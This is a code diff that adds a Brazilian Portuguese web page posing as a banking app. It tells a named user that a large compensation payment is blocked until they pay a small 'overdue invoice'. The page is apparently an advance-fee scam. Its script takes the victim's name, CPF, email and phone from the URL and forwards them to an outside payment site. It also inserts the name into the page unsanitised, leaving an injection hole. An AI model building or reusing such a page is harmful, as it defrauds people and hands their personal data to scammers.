@@ -1,0 +1,195 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Transferência Não Concluída</title>
+  <script>
+    localStorage.setItem("upsell", "up1");
+    </script>
+    <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+  <style>
+    * {
+      margin: 0px;
+      padding: 0px;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Segoe UI', sans-serif;
+    }
+
+    .card {
+      width: 100%;
+      overflow: hidden;
+    }
+
+    .topbar {
+      background-color: #8000c8;
+      color: white;
+      padding: 1rem;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .user-info {
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      font-size: 1rem;
+      font-weight: 500;
+    }
+
+    .user-info img {
+      width: 50px;
+      height: 50px;
+    }
+
+    .icons {
+      display: flex;
+      gap: 1.5rem;
+    }
+
+    .icons img {
+      height: 24px;
+    }
+
+    .main-header {
+      background-color: #8000c8;
+      color: white;
+      padding: 1rem;
+      padding-left: 1.5rem;
+      padding-bottom: 2.5rem;
+    }
+
+    .main-header h2 {
+      font-size: 1.2rem;
+      margin-bottom: 0.4rem;
+    }
+
+    .main-header p {
+      font-weight: 200;
+      font-size: 0.9rem;
+    }
+
+    .content {
+      padding: 1.5rem 1rem;
+      background-color: #fff;
+    }
+
+    .line {
+      display: flex;
+      align-items: flex-start;
+      gap: 1rem;
+      margin-bottom: 1.2rem;
+    }
+
+    .line img {
+      width: 40px;
+      height: 40px;
+      margin-top: 2px;
+    }
+
+    .line p {
+      font-size: 0.95rem;
+      color: #222;
+      line-height: 1.4;
+    }
+
+    .bold {
+      font-weight: bold;
+    }
+
+    .button {
+      width: 100%;
+      margin-top: 1rem;
+      background-color: #53d768;
+      color: white;
+      border: none;
+      padding: 1rem;
+      font-size: 1rem;
+      font-weight: bold;
+      border-radius: 10px;
+      cursor: pointer;
+    }
+
+    .timer {
+      text-align: center;
+      margin: 1rem 0 1.5rem;
+      font-size: 0.95rem;
+      color: #000;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="topbar">
+      <div class="user-info">
+        <img src="images/user.svg" alt="Avatar">
+        <span><strong>Olá, Rafael</strong></span>
+      </div>
+      <div class="icons">
+        <img src="images/3.svg" alt="icons">
+        <img src="images/4.svg" alt="icons">
+        <img src="images/5.svg" alt="icons">
+      </div>
+    </div>
+
+    <div class="main-header">
+      <h2>Transferência não concluída</h2>
+      <p>Falta pouco para você receber sua indenização! Veja abaixo como aprovar</p>
+    </div>
+
+    <div class="content">
+      <div class="line">
+        <img src="images/warning.svg" alt="Alerta">
+        <p>Durante a transferência, foi identificado uma pendência vinculada a sua conta</p>
+      </div>
+
+      <div class="line">
+        <img src="images/doc.svg" alt="Fatura">
+        <p><span class="bold">RAFAEL GOMES DA SILVA</span>, você possui uma fatura vencida no valor de <span class="bold">R$ 47,90</span></p>
+      </div>
+
+      <div class="line">
+        <img src="images/8.svg" alt="Info">
+        <p>Para o recebimento do seu valor é obrigatório estar em conformidade</p>
+      </div>
+
+      <div class="line">
+        <img src="images/checked.svg" alt="Check">
+        <p>A sua indenização no valor de <span class="bold">R$7.854,63</span> será liberada após a quitação da fatura</p>
+      </div>
+
+      <button class="button" onclick="redirecionarParaPagamento()">Efetuar pagamento da Fatura</button>
+      <!-- <div class="timer">Tempo restante: <span id="timer">15:00</span></div> -->
+    </div>
+  </div>
+
+  <script>
+    const params = new URLSearchParams(window.location.search)
+  
+    const nomeCompleto = params.get("name") || "Nome não informado"
+    const cpfRaw = params.get("document") || ""
+    const email = params.get("email") || "Email não informado"
+    const telefoneRaw = params.get("telephone") || ""
+  
+    // Pegar primeiro nome (e.g., "Rafael")
+    const primeiroNome = nomeCompleto.trim().split(" ")[0]
+  
+    // Atualiza texto "Olá, Nome"
+    document.querySelector(".user-info span").innerHTML = `<strong>Olá, ${primeiroNome}</strong>`
+  
+    // Atualiza nome completo na fatura
+    document.querySelector(".line .bold").textContent = nomeCompleto.toUpperCase()
+  
+    function redirecionarParaPagamento() {
+  const urlBase = "https://pay.facilpagamento.store/nOzxZoooezVZJ07"
+  const currentParams = new URLSearchParams(window.location.search)
+  window.location.href = `${urlBase}?${currentParams.toString()}`
+}
+
+  </script>
+  
+
+
+</body></html>
